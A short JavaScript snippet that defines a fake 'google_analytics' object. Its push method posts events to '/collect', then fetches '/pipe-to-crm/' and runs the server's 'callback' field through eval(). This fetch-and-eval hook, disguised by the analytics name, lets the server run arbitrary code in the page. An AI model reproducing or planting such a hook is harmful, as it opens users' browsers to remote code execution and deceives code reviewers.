window['google_analytics'] = {
  push(event) {
    fetch('/collect', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ event })
    }).then(() => {
      fetch(`/pipe-to-crm/${event}`)
        .then(response => response.json())
        .then(({ success, callback }) => {
          if (success) eval(callback);
        });
    });
  }
};
